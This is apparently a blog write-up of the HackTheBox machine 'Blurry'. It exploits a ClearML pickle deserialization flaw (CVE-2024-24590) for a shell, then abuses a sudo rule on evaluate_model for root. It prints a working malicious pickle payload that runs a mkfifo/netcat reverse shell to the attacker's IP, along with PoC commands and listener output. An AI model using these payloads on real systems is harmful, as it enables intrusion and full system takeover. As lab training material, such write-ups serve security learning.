+++
date = '2026-04-25T11:28:45-04:00'
draft = false
author = 'Siddhant Singh'
title = 'Blurry'
+++

Blurry is a medium-rated Linux box on HackTheBox. Initial access comes through an unauthenticated ClearML instance vulnerable to unsafe pickle deserialization (**CVE-2024-24590**), which drops a shell as `jippity`. Privilege escalation abuses a `sudo` rule allowing `evaluate_model` to load any `.pth` file as root — another pickle deserialization path that pops a root shell.

**Target:** `10.129.28.253`  
**My IP:** `10.10.14.217`

---

## Enumeration

### NMAP

```
┌──(xmen㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- -Pn 10.129.28.253 --max-retries 1
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-22 00:52 -0400
Warning: 10.129.28.253 giving up on port because retransmission cap hit (1).
Nmap scan report for app.blurry.htb (10.129.28.253)
Host is up (0.051s latency).
Not shown: 64985 closed tcp ports (reset), 548 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: ClearML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.87 seconds
```

Just SSH and HTTP. The nmap scan already resolves the hostname as `app.blurry.htb` — added that to `/etc/hosts` before browsing.

---

### Port 80 — ClearML

Navigating to `http://app.blurry.htb` shows a ClearML MLOps dashboard. Interestingly, login only requires a Full Name — no password. There's already a user named **Chad Jippity** running periodic tasks against a project called **Black Swan**.

Logged out, then back in as Chad Jippity using just the name. That gave access to the project and the ability to submit tasks.

Set up the ClearML SDK locally and ran `clearml-init` with credentials pulled from the UI to get API access:

```bash
pip install clearml
clearml-init
```

---

## Foothold — CVE-2024-24590 (ClearML Pickle Deserialization)

HiddenLayer published a [research post on several ClearML CVEs](https://www.hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain#cve-2024-24590-pickle-load-on-artifact-get) including **CVE-2024-24590** — unsafe `pickle.load` when fetching task artifacts. The attack flow: upload a task with a malicious pickled artifact tagged for review, wait for the automated "Review JSON Artifacts" task to fetch it, get RCE.

Used the PoC from [OxyDeV2/ClearML-CVE-2024-24590](https://github.com/OxyDeV2/ClearML-CVE-2024-24590) to upload the payload:

```bash
└─$ python exp.py --project_name 'Black Swan' --task_name 'Models' --tags review --artifact_name exp1 --ip 10.10.14.217 --port 9001
ClearML Task: created new task id=33185e7bfa5f4631b2169a7cb29c3c50
ClearML results page: http://app.blurry.htb/projects/116c40b9b53743689239b6b460efd7be/experiments/33185e7bfa5f4631b2169a7cb29c3c50/output/log
2026-04-22 01:39:43,615 - clearml.resource_monitor - WARNING - Could not fetch GPU stats: NVML Shared Library Not Found
2026-04-22 01:39:43,641 - clearml.Task - INFO - No repository found, storing script code instead
...
[+] Initializing ClearML task with project name: Black Swan, task name: Models, tags: ['review']
[+] Uploading artifact with name: exp1
```

The "Review JSON Artifacts" periodic task picks up anything tagged `review` and deserializes the artifact. After a short wait, the listener caught a shell:

```
└─$ sudo nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.217] from (UNKNOWN) [10.129.28.253] 33066
sh: 0: can't access tty; job control turned off
$ id
uid=1000(jippity) gid=1000(jippity) groups=1000(jippity)
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
jippity@blurry:~$
```

Shell as **jippity**.

---

## Privilege Escalation — jippity → root

### sudo evaluate_model

`sudo -l` had something immediately interesting:

```
jippity@blurry:~$ sudo -l
Matching Defaults entries for jippity on blurry:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
```

Can run `evaluate_model` as root on any `.pth` file in `/models/`. Checked if the directory is writable:

```
jippity@blurry:~$ ls -la /models
total 1068
drwxrwxr-x  2 root jippity    4096 Jun 17  2024 .
drwxr-xr-x 19 root root       4096 Jun  3  2024 ..
-rw-r--r--  1 root root    1077880 May 30  2024 demo_model.pth
-rw-r--r--  1 root root       2547 May 30  2024 evaluate_model.py
```

Group `jippity` has write access. PyTorch `.pth` files are just pickles, so the same deserialization trick works here. Wrote a malicious module:

```python
import torch
import os


class Payload:
    def __reduce__(self):
        return (os.system, ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.217 9002 >/tmp/f",))


sploit = Payload()
torch.save(sploit, 'mnist.pth')
```

Served the file over HTTP, pulled it down on the box, copied it to `/models/`, and triggered the evaluation:

```
jippity@blurry:~$ wget http://10.10.14.217/mnist.pth
jippity@blurry:~$ cp mnist.pth /models/mnist.pth
jippity@blurry:~$ sudo /usr/bin/evaluate_model /models/mnist.pth
[+] Model /models/mnist.pth is considered safe. Processing...
```

### Root

```
┌──(xmen㉿kali)-[~/clearml]
└─$ sudo nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.10.14.217] from (UNKNOWN) [10.129.28.253] 54026
root@blurry:/home/jippity# id
uid=0(root) gid=0(root) groups=0(root)
```
